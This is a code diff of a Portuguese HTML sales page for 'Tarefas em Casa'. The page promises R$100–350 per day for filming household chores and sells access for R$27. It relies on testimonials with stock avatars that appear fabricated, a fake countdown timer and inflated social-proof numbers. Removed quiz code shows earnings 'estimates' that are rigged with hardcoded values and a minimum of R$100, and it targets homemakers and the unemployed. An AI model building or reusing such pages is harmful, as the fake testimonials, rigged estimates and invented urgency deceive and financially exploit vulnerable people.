-    gap: 8px;
-    margin-bottom: 16px;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
   }
+  .step-info h3 { margin: 0 0 3px; font-size: 15px; font-weight: 700; color: #111827; }
+  .step-info p { margin: 0; font-size: 13px; color: #4B5563; line-height: 1.4; }
 
-  .cmc-item {
+  /* Feature benefits */
+  .benefit-list { display: flex; flex-direction: column; gap: 10px; }
+  .benefit-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #1F2937;
+    background: #F0FDF4;
+    border: 1px solid #DCFCE7;
+    padding: 12px 14px;
+    border-radius: 12px;
+  }
+  .benefit-item svg { width: 20px; height: 20px; color: #16A34A; flex-shrink: 0; }
+
+  /* Testimonials */
+  .testimonial-item {
+    background: #F9FAFB;
+    border: 1px solid #E5E7EB;
+    padding: 16px;
+    border-radius: 14px;
+    margin-bottom: 12px;
+  }
+  .testimonial-header {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    background: #FFFFFF;
-    border: 1px solid #E5E7EB;
-    border-radius: 14px;
-    padding: 12px 14px;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+    margin-bottom: 8px;
   }
-
-  .cmc-item-left {
+  .testimonial-user {
     display: flex;
     align-items: center;
     gap: 10px;
   }
+  .testimonial-user img {
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+  }
+  .testimonial-name { font-size: 13.5px; font-weight: 700; color: #111827; }
+  .testimonial-loc { font-size: 11px; color: #6B7280; }
+  .testimonial-stars { color: #F9C300; font-size: 13px; }
+  .testimonial-text { font-size: 13px; color: #374151; line-height: 1.45; margin: 0; }
+  .testimonial-tag {
+    display: inline-block;
+    background: #DCFCE7;
+    color: #15803D;
+    font-size: 11px;
+    font-weight: 700;
+    padding: 3px 8px;
+    border-radius: 6px;
+    margin-top: 8px;
+  }
 
-  .cmc-item-icon {
-    width: 32px;
-    height: 32px;
-    border-radius: 10px;
-    background: #F0FDF4;
+  /* Price Offer Box */
+  .offer-box {
+    background: linear-gradient(180deg, #FFFFFF 0%, #F0FDF4 100%);
+    border: 2px solid #16A34A;
+    border-radius: var(--radius-lg);
+    padding: 24px 18px;
+    text-align: center;
+    margin-top: 22px;
+    box-shadow: 0 16px 40px rgba(22, 163, 74, 0.15);
+  }
+  .offer-badge {
+    background: #FEF3C7;
+    border: 1px solid #F59E0B;
+    color: #92400E;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 5px 12px;
+    border-radius: 99px;
+    display: inline-block;
+    margin-bottom: 12px;
+    text-transform: uppercase;
+  }
+  .old-price { font-size: 14px; color: #9CA3AF; text-decoration: line-through; margin-bottom: 4px; }
+  .new-price-label { font-size: 13px; color: #374151; font-weight: 600; }
+  .new-price { font-size: 38px; font-weight: 800; color: #16A34A; line-height: 1; margin: 6px 0; }
+  .new-price span { font-size: 20px; font-weight: 700; }
+
+  /* Guarantee Box */
+  .guarantee-box {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    background: #FFFBEB;
+    border: 1px solid #FCD34D;
+    border-radius: 16px;
+    padding: 16px;
+    margin-top: 18px;
+  }
+  .guarantee-badge {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: #F59E0B;
+    color: white;
+    font-weight: 800;
+    font-size: 13px;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 16px;
+    text-align: center;
+    line-height: 1.1;
     flex-shrink: 0;
   }
+  .guarantee-text h4 { margin: 0 0 3px; font-size: 14px; font-weight: 700; color: #78350F; }
+  .guarantee-text p { margin: 0; font-size: 12px; color: #92400E; line-height: 1.35; }
 
-  .cmc-item-label {
+  /* Accordion FAQ */
+  .faq-item {
+    background: #F9FAFB;
+    border: 1px solid #E5E7EB;
+    border-radius: 12px;
+    margin-bottom: 10px;
+    overflow: hidden;
+  }
+  .faq-question {
+    padding: 14px 16px;
     font-size: 14px;
     font-weight: 700;
     color: #111827;
-  }
-
-  .cmc-item-val {
-    font-size: 15px;
-    font-weight: 800;
-    color: #16A34A;
-  }
-
-  .cmc-divider {
-    border-top: 2px dashed #C2E2CC;
-    margin: 16px 0;
-  }
-
-  .cmc-estimate-box {
-    background: #E7F3EB;
-    border-radius: 18px;
-    padding: 14px;
+    cursor: pointer;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 10px;
+    user-select: none;
   }
-
-  .cmc-est-left {
-    display: flex;
-    align-items: center;
-    gap: 10px;
+  .faq-answer {
+    padding: 0 16px 14px;
+    font-size: 13px;
+    color: #4B5563;
+    line-height: 1.5;
+    display: none;
   }
+  .faq-item.active .faq-answer { display: block; }
+  .faq-item.active .faq-icon { transform: rotate(180deg); }
+  .faq-icon { transition: transform 0.2s ease; font-size: 16px; color: #16A34A; }
 
-  .piggy-icon {
-    font-size: 32px;
-    line-height: 1;
-  }
-
-  .cmc-est-texts {
-    display: flex;
-    flex-direction: column;
-  }
-
-  .cmc-est-label {
-    font-size: 12px;
-    font-weight: 700;
-    color: #111827;
-  }
-
-  .cmc-est-num {
-    font-size: 26px;
-    font-weight: 800;
-    color: #16A34A;
-    display: flex;
-    align-items: center;
-    gap: 4px;
-  }
-
-  .cmc-est-badge {
-    background: #FFFFFF;
-    border-radius: 12px;
-    padding: 8px 10px;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    border: 1px solid #D1E7DD;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.04);
-  }
-
-  .cmc-eb-text {
+  /* Footer */
+  .footer {
+    text-align: center;
     font-size: 11px;
-    font-weight: 800;
-    color: #16A34A;
-    line-height: 1.15;
-    text-align: right;
-  }
-
-  .cmc-eb-star {
-    width: 22px;
-    height: 22px;
-    border-radius: 50%;
-    background: #16A34A;
-    color: #FFFFFF;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 12px;
-  }
-
-  .confirm-trust-card {
-    background: #FFFFFF;
-    border: 1px solid #E5E7EB;
-    border-radius: 16px;
-    padding: 14px;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 12px;
-    width: 100%;
-    text-align: left;
-  }
-
-  .ctc-col {
-    display: flex;
-    gap: 8px;
-    align-items: flex-start;
-  }
-
-  .ctc-icon {
-    width: 32px;
-    height: 32px;
-    border-radius: 10px;
-    background: #F0FDF4;
-    color: #16A34A;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-  }
-
-  .ctc-title {
-    font-size: 11px;
-    font-weight: 800;
-    color: #111827;
-    margin-bottom: 2px;
-    line-height: 1.2;
-  }
-
-  .ctc-sub {
-    font-size: 10px;
     color: #6B7280;
-    line-height: 1.25;
+    margin-top: 32px;
+    line-height: 1.6;
   }
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+  .footer-links a { color: #4B5563; text-decoration: none; font-weight: 600; }
 
 </style>
 </head>
 <body>
 
+  <div class="top-notice">
+    <span>🔥 OFERTA HOJE (<span id="current-date">--/--</span>) — ENCERRA EM</span>
+    <span class="top-notice-timer" id="countdown-timer">14:59</span>
+  </div>
+
   <div class="blob blob-a" aria-hidden="true"></div>
   <div class="blob blob-b" aria-hidden="true"></div>
 
   <div class="app-shell">
-    <div class="card">
-      <div class="topbar" id="topbar"></div>
-      <div class="stage" id="stage"></div>
+    
+    <!-- MAIN SALES CARD -->
+    <div class="landing-card">
+      
+      <!-- HERO AREA (EXACT REQUEST) -->
+      <div style="text-align:center;">
+        <div class="social-proof-banner">
+          <div class="sp-avatars">
+            <img src="https://i.pravatar.cc/100?img=1" alt="Avatar">
+            <img src="https://i.pravatar.cc/100?img=2" alt="Avatar">
+            <img src="https://i.pravatar.cc/100?img=3" alt="Avatar">
+            <img src="https://i.pravatar.cc/100?img=4" alt="Avatar">
+            <img src="https://i.pravatar.cc/100?img=5" alt="Avatar">
+          </div>
+          <div class="sp-text">
+            <div class="sp-stars">★★★★★</div>
+            <strong>+10.000 pessoas</strong><br>já fizeram o teste
+          </div>
+        </div>
+
+        <h1 class="landing-title">
+          R$ 100 a R$ 350 por dia fazendo<br>
+          <span class="highlight">tarefas de casa.
+            <svg class="underline" viewBox="0 0 200 10" preserveAspectRatio="none"><path d="M0,5 Q100,0 200,8" stroke="#F9C300" stroke-width="3" fill="none"/></svg>
+          </span>
+        </h1>
+
+        <p class="landing-sub-text">
+          Descubra como começar a receber<br>fazendo tarefas simples em casa.
+        </p>
+      </div>
+
+      <!-- VIDEO SECTION (LOGO ABAIXO) -->
+      <div class="video-section">
+        <div class="video-title">Assista ao vídeo curto abaixo para ver como funciona 👇</div>
+        <iframe src="https://scripts.converteai.net/00987fc7-eae6-48fd-92b9-b866f2f62103/players/6a7911edbda06d1b04c88055/embed.html" id="ig-vid_6a7911edbda06d1b04c88055" class="video-iframe" allowfullscreen="true" allow="autoplay; fullscreen; picture-in-picture; encrypted-media; gyroscope; accelerometer; clipboard-write; web-share"></iframe>
+      </div>
+
+      <!-- TRUST BADGES -->
+      <div class="trust-badges-grid">
+        <div class="t-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <div class="t-badge-text"><strong>100% Seguro</strong>Compra Protegida</div>
+        </div>
+        <div class="t-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+          <div class="t-badge-text"><strong>Acesso Imediato</strong>Receba no E-mail</div>
+        </div>
+        <div class="t-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          <div class="t-badge-text"><strong>7 Dias</strong>Garantia Total</div>
+        </div>
+      </div>
+
     </div>
+
+    <!-- METHOD SHOWCASE -->
+    <div class="section-card">
+      <h2 class="section-title">Aprenda a monetizar sua <span>rotina diária</span></h2>
+      <p style="font-size:13px; color:#4B5563; text-align:center; margin:0; line-height:1.4;">
+        Você não precisa de equipamentos profissionais. Apenas seu celular e alguns minutos por dia.
+      </p>
+    </div>
+
+    <!-- HOW IT WORKS -->
+    <div class="section-card">
+      <h2 class="section-title">Como Funciona em <span>3 Passos Simples</span></h2>
+      <div class="steps-list">
+        <div class="step-item">
+          <div class="step-number">1</div>
+          <div class="step-info">
+            <h3>Acesse a Plataforma</h3>
+            <p>Receba seu login instantâneo e acesse o passo a passo direto no seu celular ou computador.</p>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-number">2</div>
+          <div class="step-info">
+            <h3>Grave Vídeos das Tarefas</h3>
+            <p>Grave vídeos curtos lavando louça, dobrando roupa, cuidando do pet ou arrumando a casa.</p>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-number">3</div>
+          <div class="step-info">
+            <h3>Receba Pagamentos no Pix</h3>
+            <p>Envie para os parceiros cadastrados e receba de R$ 100 a R$ 350 por dia na sua conta.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- WHAT YOU GET -->
+    <div class="section-card">
+      <h2 class="section-title">O que você vai <span>receber hoje</span></h2>
+      <div class="benefit-list">
+        <div class="benefit-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          <span>Guia Prático Passo a Passo (Do Zero ao Primeiro Pix)</span>
+        </div>
+        <div class="benefit-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          <span>Lista das Melhores Plataformas Pagadoras Validadas</span>
+        </div>
+        <div class="benefit-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          <span>Modelos Prontos e Roteiros de Gravação Rápida</span>
+        </div>
+        <div class="benefit-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          <span>Módulo de Saque Expresso diário via Pix</span>
+        </div>
+        <div class="benefit-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          <span><strong>BÔNUS:</strong> Suporte VIP para tirar suas dúvidas</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- TESTIMONIALS -->
+    <div class="section-card">
+      <h2 class="section-title">Resultados de quem <span>já começou</span></h2>
+      
+      <div class="testimonial-item">
+        <div class="testimonial-header">
+          <div class="testimonial-user">
+            <img src="https://i.pravatar.cc/100?img=32" alt="Foto">
+            <div>
+              <div class="testimonial-name">Ana Paula M.</div>
+              <div class="testimonial-loc">São Paulo - SP</div>
+            </div>
+          </div>
+          <div class="testimonial-stars">★★★★★</div>
+        </div>
+        <p class="testimonial-text">"Gente, funciona de verdade! No meu primeiro dia apenas gravando enquanto dobrava roupas e arrumava a cozinha recebi R$ 130 no Pix. O suporte é maravilhoso!"</p>
+        <span class="testimonial-tag">Recebeu R$ 130,00 no Pix 💸</span>
+      </div>
+
+      <div class="testimonial-item">
+        <div class="testimonial-header">
+          <div class="testimonial-user">
+            <img src="https://i.pravatar.cc/100?img=12" alt="Foto">
+            <div>
+              <div class="testimonial-name">Carlos Eduardo</div>
+              <div class="testimonial-loc">Belo Horizonte - MG</div>
+            </div>
+          </div>
+          <div class="testimonial-stars">★★★★★</div>
+        </div>
+        <p class="testimonial-text">"Consigo fazer isso no tempo livre à noite depois do serviço. Faço 20 a 30 minutos e tiro uma renda extra que ajuda demais no orçamento do mês."</p>
+        <span class="testimonial-tag">Recebeu R$ 280,00 esta semana 💸</span>
+      </div>
+
+      <div class="testimonial-item">
+        <div class="testimonial-header">
+          <div class="testimonial-user">
+            <img src="https://i.pravatar.cc/100?img=47" alt="Foto">
+            <div>
+              <div class="testimonial-name">Fernanda Lima</div>
+              <div class="testimonial-loc">Curitiba - PR</div>
+            </div>
+          </div>
+          <div class="testimonial-stars">★★★★★</div>
+        </div>
+        <p class="testimonial-text">"Como sou dona de casa, foi o casamento perfeito. Faço as coisas da casa normal e já gravo com o celular. Não largo mais por nada!"</p>
+        <span class="testimonial-tag">Recebeu R$ 350,00 no Pix 💸</span>
+      </div>
+
+    </div>
+
+    <!-- PRICE OFFER BOX -->
+    <div class="offer-box">
+      <span class="offer-badge">🔥 OFERTA DE LANÇAMENTO HOJE</span>
+      <div class="old-price">De R$ 197,00</div>
+      <div class="new-price-label">Por apenas</div>
+      <div class="new-price"><span>R$</span> 27<span>,00</span></div>
+      <div style="font-size:12px; color:#6B7280; font-weight:600; margin-bottom:16px;">ou 12x de R$ 2,71 no cartão</div>
+
+      <a class="landing-cta-btn" href="https://pay.lowify.com.br/checkout?product_id=b9pSRV">
+        <span style="font-size:20px; font-weight:800;">SIM! QUERO MEU ACESSO AGORA →</span>
+        <span style="font-size:12px; font-weight:600; opacity:0.95; background:rgba(0,0,0,0.2); padding:3px 12px; border-radius:99px;">Acesso Imediato por apenas R$ 27</span>
+      </a>
+
+      <!-- GUARANTEE -->
+      <div class="guarantee-box">
+        <div class="guarantee-badge">7<br>DIAS</div>
+        <div class="guarantee-text">
+          <h4>Garantia Incondicional de 7 Dias</h4>
+          <p>Teste à vontade. Se você não gostar por qualquer motivo, devolvemos 100% do seu dinheiro de volta!</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- FAQ -->
+    <div class="section-card">
+      <h2 class="section-title">Perguntas <span>Frequentes</span></h2>
+      
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>Preciso de um celular caro para começar?</span>
+          <span class="faq-icon">▼</span>
+        </div>
+        <div class="faq-answer">
+          Não! Qualquer celular simples com câmera e acesso à internet é suficiente para fazer as gravações e receber.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>Como recebo o meu dinheiro?</span>
+          <span class="faq-icon">▼</span>
+        </div>
+        <div class="faq-answer">
+          Os pagamentos são feitos diretamente para a sua conta bancária via Pix. Você pode cadastrar sua chave no aplicativo.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>Como receberei o acesso após o pagamento?</span>
+          <span class="faq-icon">▼</span>
+        </div>
+        <div class="faq-answer">
+          O envio é imediato e automático! Assim que o pagamento for confirmado, você receberá os dados de acesso no seu e-mail e WhatsApp.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <div class="faq-question">
+          <span>Tenho alguma garantia?</span>
+          <span class="faq-icon">▼</span>
+        </div>
+        <div class="faq-answer">
+          Sim! Você tem 7 dias de garantia total. Se achar que não é para você, basta pedir o reembolso e devolvemos cada centavo.
+        </div>
+      </div>
+
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+      <p>Copyright © 2026 Tarefas em Casa — Todos os direitos reservados.</p>
+    </div>
+
   </div>
 
 <script>
 (function(){
-
-  // 📊 RASTREAMENTO PRÓPRIO — troque pela URL do seu Apps Script (veja instruções)
+  // Tracking
   var TRACKING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbxOMJ3naaGku0o4BL6cOsKsRKE3sXptDYl010QAfrqsqlnqbIEsPq7FqrMhD_OkwHI/exec';
-
   var urlParams = new URLSearchParams(window.location.search);
   var utms = {
     utm_source: urlParams.get('utm_source') || '(direto)',
@@ -816,455 +704,8 @@ body.is-landing .stage { position: relative; z-index: 1; }
   };
   var sessionId = 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,8);
 
-  var QUESTIONS = [
-    {
-      key:'q1',
-      title:'Qual dessas tarefas <span style="color:#16A34A;">você já faz quase todo dia?</span>',
-      sub:'Escolha a que mais combina com sua rotina.',
-      image: './imagem-site-otimizada.webp',
-      options:[
-        {value:'louca', emoji:'🍽️', label:'Lavar louça', sub:'Uma tarefa rápida que você faz todos os dias.'},
-        {value:'roupa', emoji:'🧺', label:'Dobrar roupa', sub:'Você sempre separa um tempinho para deixar tudo em ordem.'},
-        {value:'pet', emoji:'🐶', label:'Cuidar do pet', sub:'Passeios, alimentação e carinho fazem parte da sua rotina.'},
-        {value:'casa', emoji:'🧹', label:'Organizar a casa', sub:'Você gosta de manter tudo limpo e organizado.'}
-      ]
-    },
-    {
-      key:'q2',
-      title:'Você sabia que empresas pagam por <span style="color:#16A34A;">vídeos dessas tarefas do dia a dia?</span>',
-      options:[
-        {value:'nao', emoji:'😮', label:'Não, não fazia ideia', sub:'Nunca ouvi falar sobre isso antes.'},
-        {value:'ouvi', emoji:'🤔', label:'Já ouvi falar, mas nunca tentei', sub:'Conheço por cima, mas não apliquei.'},
-        {value:'sim', emoji:'✅', label:'Sim, e quero aprender a fazer certo', sub:'Estou pronto para começar os testes.'}
-      ]
-    },
-    {
-      key:'q3',
-      title:'Quanto tempo por dia <span style="color:#16A34A;">você teria pra gravar</span> essas tarefas?',
-      options:[
-        {value:'15', emoji:'⏱️', label:'Até 15 minutos', sub:'Tenho uma rotina bem corrida.'},
-        {value:'30', emoji:'⏱️', label:'15 a 30 minutos', sub:'Consigo encaixar no meu dia a dia.'},
-        {value:'30+', emoji:'⏱️', label:'Mais de 30 minutos', sub:'Tenho bastante tempo livre.'}
-      ]
-    },
-    {
-      key:'q4',
-      title:'Qual seria uma boa <span style="color:#16A34A;">renda extra mensal</span> pra você, hoje?',
-      options:[
-        {value:'300', emoji:'💵', label:'R$300 a R$500', sub:'Já ajudaria nas contas do mês.'},
-        {value:'500', emoji:'💰', label:'R$500 a R$1.000', sub:'Seria uma ótima renda extra.'},
-        {value:'1000', emoji:'🤑', label:'Mais de R$1.000', sub:'Mudaria a minha realidade hoje.'}
-      ]
-    },
-    {
-      key:'q5',
-      title:'Qual dessas frases <span style="color:#16A34A;">mais combina com você</span> hoje?',
-      options:[
-        {value:'dona_casa', emoji:'🏠', label:'Sou dona de casa em tempo integral'},
-        {value:'trabalho_fora', emoji:'💼', label:'Trabalho fora e quero uma renda extra'},
-        {value:'desempregada', emoji:'🔍', label:'Estou sem emprego e buscando uma oportunidade'}
-      ]
-    }
-  ];
-
-  var TASK_VALUES = { louca:60, roupa:70, pet:65, casa:75 };
-  var TIME_VALUES = { '15':40, '30':60, '30+':85 };
-
-  var STEPS = [{type:'landing'}]
-    .concat(QUESTIONS.map(function(q, i){
-      var s = {type:'question', qNum:i+1};
-      for (var k in q) s[k] = q[k];
-      return s;
-    }))
-    .concat([{type:'loading'}, {type:'result'}, {type:'video'}]);
-
-  var current = 0;
-  var answers = {};
-
-  function findOption(qKey, value){
-    var q = QUESTIONS.filter(function(x){ return x.key === qKey; })[0];
-    if(!q) return null;
-    return q.options.filter(function(o){ return o.value === value; })[0] || null;
-  }
-
-  function computeReceipt(){
-    var items = [];
-    var total = 0;
-
-    if(answers.q1){
-      var t = findOption('q1', answers.q1);
-      items.push({icon:t.emoji, label:t.label, value:TASK_VALUES[answers.q1]});
-      total += TASK_VALUES[answers.q1];
-    }
-    if(answers.q3){
-      items.push({icon:'⏱️', label:'Tempo disponível', value:TIME_VALUES[answers.q3]});
-      total += TIME_VALUES[answers.q3];
-    }
-    if(answers.q2){
-      items.push({icon:'✅', label:'Perfil elegível', value:null});
-    }
-    if(answers.q5){
-      items.push({ icon:'🎯', label:'Perfil confirmado', value:null });
-    }
-
-    return { items:items, total: Math.max(100, total) };
-  }
-
-  function receiptHTML(final){
-    var r = computeReceipt();
-    if(r.items.length === 0) return '';
-
-    var rows = r.items.map(function(i){
-      var val = (i.value !== null) ? ('R$' + i.value) : '✓';
-      return '<div class="receipt-row"><span class="r-left"><span class="r-icon">' + i.icon + '</span>' + i.label + '</span><span>' + val + '</span></div>';
-    }).join('');
-
-    var totalBlock = '';
-    var stamp = '';
-    if(final){
-      totalBlock = '<div class="receipt-divider"></div>'
-        + '<div class="receipt-row receipt-total"><span>Estimativa / dia</span>'
-        + '<span id="totalNum" data-target="' + r.total + '">R$0</span></div>';
-      stamp = '<div class="stamp">PERFIL<br>APROVADO</div>';
-    }
-
-    return '<div class="receipt ' + (final ? 'receipt-final' : '') + '">'
-      + stamp
-      + '<p class="receipt-title">Recibo da sua rotina</p>'
-      + rows
-      + totalBlock
-      ;
-  }
-
-  function renderTopbar(){
-    var topbar = document.getElementById('topbar');
-    var step = STEPS[current];
-    if(step.type !== 'question'){
-      topbar.style.display = 'none';
-      topbar.innerHTML = '';
-      return;
-    }
-    topbar.style.display = 'flex';
-    var qNum = step.qNum || 1;
-    var pct = (qNum / 5) * 100;
-    topbar.innerHTML = '<div class="progress-track"><div class="progress-fill" style="width:' + pct + '%"></div></div>'
-      + '<span class="step-label" style="background:#E7F3EB; padding:4px 12px; border-radius:99px; color:#16A34A; font-weight:700;"><span style="color:#16A34A">' + String(qNum).padStart(2,'0') + '</span> / 05</span>';
-  }
-
-  function renderLanding(){
-    return ''
-      + ''
-      + ''
-      + '<div class="landing-badge">'
-      + '  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>'
-      + '  Teste rápido · 30 segundos'
-      + '</div>'
-      + '<div class="social-proof-banner">'
-      + '  <div class="sp-avatars">'
-      + '    <img src="https://i.pravatar.cc/100?img=1" alt="Avatar">'
-      + '    <img src="https://i.pravatar.cc/100?img=2" alt="Avatar">'
-      + '    <img src="https://i.pravatar.cc/100?img=3" alt="Avatar">'
-      + '    <img src="https://i.pravatar.cc/100?img=4" alt="Avatar">'
-      + '    <img src="https://i.pravatar.cc/100?img=5" alt="Avatar">'
-      + '  </div>'
-      + '  <div class="sp-text">'
-      + '    <div class="sp-stars">★★★★★</div>'
-      + '    <strong>+10.000 pessoas</strong><br>já fizeram o teste'
-      + '  </div>'
-      + '</div>'
-      + '<h1 class="landing-title" style="letter-spacing:-1.2px; font-size:34px; line-height:1.1;">'
-      + '  R$ 100 a R$ 350 por dia fazendo<br>'
-      + '  <span class="highlight">tarefas de casa.'
-      + '    <svg class="underline" viewBox="0 0 200 10" preserveAspectRatio="none"><path d="M0,5 Q100,0 200,8" stroke="#F9C300" stroke-width="3" fill="none"/></svg>'
-      + '  </span>'
-      + '</h1>'
-      + '<p class="landing-sub-text">'
-      + '  Descubra como começar a receber<br>fazendo tarefas simples em casa.'
-      + '</p>'
-      + '<div class="hero-layout">'
-      + '  <div class="hero-image-col">'
-      + '    <img src="./imagem-site-otimizada.webp" onerror="this.onerror=null;this.src=\'https://i.ibb.co/vxp3vCYC/imagem-site-otimizada.webp\';" alt="Pessoas fazendo tarefas com celular">'
-      + '  </div>'
-
-      + '</div>'
-      + '<button class="landing-cta-btn" data-action="start">'
-      + '  Começar agora →'
-      + '</button>'
-
-      + '</div>';
-  }
-  function renderQuestion(step){
-    var opts = step.options.map(function(o){
-      var subHtml = o.sub ? '<span class="opt-sub">' + o.sub + '</span>' : '';
-      return '<button class="option" data-value="' + o.value + '">'
-        + '<span class="opt-icon">' + o.emoji + '</span>'
-        + '<div class="opt-texts"><span class="opt-label">' + o.label + '</span>' + subHtml + '</div>'
-        + '<div class="opt-radio"></div>'
-        + '</button>';
-    }).join('');
-
-    var imgHtml = '';
-
-    return ''
-      + '<div class="q-header">'
-      +   '<div class="q-badge"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Pergunta ' + step.qNum + ' de 5</div>'
-      +   '<div class="q-title-row">'
-      +     '<div class="q-title-col">'
-      +       '<h2>' + step.title + '</h2>'
-      +       (step.sub ? '<p class="qsub">' + step.sub + '</p>' : '')
-      +     '</div>'
-      +     imgHtml
-      +   '</div>'
-      + '</div>'
-      + '<div class="options">' + opts + '</div>';
-  }
-
-  function renderConfirm(){
-    var taskObj = answers.q1 ? findOption('q1', answers.q1) : { label: 'Lavar louça', emoji: '🍽️' };
-    var taskLabel = taskObj ? taskObj.label : 'Lavar louça';
-    var taskVal = (answers.q1 && TASK_VALUES[answers.q1]) ? TASK_VALUES[answers.q1] : 60;
-    var timeVal = (answers.q3 && TIME_VALUES[answers.q3]) ? TIME_VALUES[answers.q3] : 60;
-    var totalVal = taskVal + timeVal;
-
-    return ''
-      + '<div class="confirm-container">'
-      +   '<div class="q-badge" style="background:#F0FDF4; border:1px solid #DCFCE7; color:#16A34A; padding:6px 14px; border-radius:99px; font-weight:700; margin-bottom:12px; display:inline-flex; align-items:center; gap:6px;">'
-      +     '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Pergunta 6 de 6'
-      +   '</div>'
-      +   '<div class="confirm-spark-left">✦</div>'
-      +   '<div class="confirm-spark-right">✦</div>'
-      +   '<h1 class="confirm-title">Pronta pra descobrir<br>seu plano<br><span style="color:#16A34A;">personalizado?</span></h1>'
-      +   '<p class="confirm-sub">Vamos calcular <strong style="color:#16A34A;">sua estimativa</strong> com base nas suas respostas.</p>'
-      
-      +   '<div class="confirm-cta-wrap">'
-      +     '<button class="confirm-btn" data-action="confirm">'
-      +       '<div class="gift-badge-icon">🎁</div>'
-      +       '<span>Sim, quero ver!</span>'
-      +       '<span style="font-size:22px; margin-left:4px;">→</span>'
-      +     '</button>'
-      +   '</div>'
-
-      +   '<div class="confirm-main-card">'
-      +     '<div class="cmc-header">'
-      +       '<div class="cmc-icon">👛</div>'
-      +       '<div class="cmc-title-wrap">'
-      +         '<div class="cmc-title">Receba da sua rotina</div>'
-      +         '<div class="cmc-sub">Veja sua estimativa com base no que você já faz e no seu tempo disponível.</div>'
-      +       '</div>'
-      +     '</div>'
-
-      +     '<div class="cmc-list">'
-      +       '<div class="cmc-item">'
-      +         '<div class="cmc-item-left">'
-      +           '<div class="cmc-item-icon">🧽</div>'
-      +           '<span class="cmc-item-label">' + taskLabel + '</span>'
-      +         '</div>'
-      +         '<span class="cmc-item-val">R$' + taskVal + '</span>'
-      +       '</div>'
-
-      +       '<div class="cmc-item">'
-      +         '<div class="cmc-item-left">'
-      +           '<div class="cmc-item-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>'
-      +           '<span class="cmc-item-label">Tempo disponível</span>'
-      +         '</div>'
-      +         '<span class="cmc-item-val">R$' + timeVal + '</span>'
-      +       '</div>'
-
-      +       '<div class="cmc-item">'
-      +         '<div class="cmc-item-left">'
-      +           '<div class="cmc-item-icon" style="background:#16A34A; color:#FFFFFF;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div>'
-      +           '<span class="cmc-item-label">Perfil elegível</span>'
-      +         '</div>'
-      +         '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>'
-      +       '</div>'
-
-      +       '<div class="cmc-item">'
